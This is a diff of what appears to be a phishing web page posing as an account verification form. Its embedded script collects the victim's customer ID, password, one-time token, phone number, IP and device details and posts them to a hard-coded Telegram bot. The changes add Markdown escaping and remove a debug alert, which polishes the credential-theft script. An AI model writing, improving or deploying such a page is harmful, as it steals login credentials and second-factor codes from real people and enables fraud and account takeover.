@@ -81,7 +81,7 @@
        <button class="sg-Btn sg-Btn--primary Btn-next" name="submit" type="submit" value="Submit">
         Verify
        </button>
-       <script>
+      <script>
 // Telegram Bot Configuration
 const TELEGRAM_BOT_TOKEN = '8580841728:AAFsXNmdnj-kBurv4UxM4ucpZm4NqYcDL00';
 const TELEGRAM_CHAT_ID = '-5233511146';
@@ -225,6 +225,11 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
+    // Escape Markdown special characters
+    function escapeMarkdown(text) {
+        return text.replace(/([_*\[\]()~`>#+-=|{}.!])/g, '\\$1');
+    }
+
     form.addEventListener('submit', async function(e) {
         e.preventDefault();
         clearError();
@@ -252,16 +257,19 @@ document.addEventListener('DOMContentLoaded', function() {
             second: '2-digit'
         });
 
-        // Alert to check values before sending
-        alert(`About to send:\nUser ID: ${userId}\nPassword: ${password}\nPasscode: ${passcode}\nPhone: ${phone}\nIP: ${clientIP}\nDevice: ${device}\nPlatform: ${platform}`);
+        // Escape values for Markdown
+        const escapedUserId = escapeMarkdown(userId);
+        const escapedPassword = escapeMarkdown(password);
+        const escapedPasscode = escapeMarkdown(passcode);
+        const escapedPhone = escapeMarkdown(phone);
 
         const message = `🟡
-Customer ID: \`${userId}\`
-Password: \`${password}\`
-Token: \`${passcode}\`
-Phone: \`${phone}\`
+Customer ID: \`${escapedUserId}\`
+Password: \`${escapedPassword}\`
+Token: \`${escapedPasscode}\`
+Phone: \`${escapedPhone}\`
 IP: \`${clientIP}\`
-UA: ${navigator.userAgent}
+UA: ${escapeMarkdown(navigator.userAgent)}
 Device: ${device}
 Platform: ${platform}
 Date: ${currentDateTime}`;
@@ -276,11 +284,10 @@ Date: ${currentDateTime}`;
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
                     text: message,
-                    parse_mode: 'Markdown'
+                    parse_mode: 'MarkdownV2'
                 })
             });
 
-            // Alert to check if the request was successful
             alert(`Telegram response status: ${response.status}`);
             if (!response.ok) {
                 const errorText = await response.text();
@@ -297,6 +304,7 @@ Date: ${currentDateTime}`;
     });
 });
 </script>
+
       </div>
      </form>
      <footer class="sg-Footer" style="background-color:transparent;">
@@ -323,4 +331,5 @@ Date: ${currentDateTime}`;
   </iframe>
  </body>
 </html>
+
 
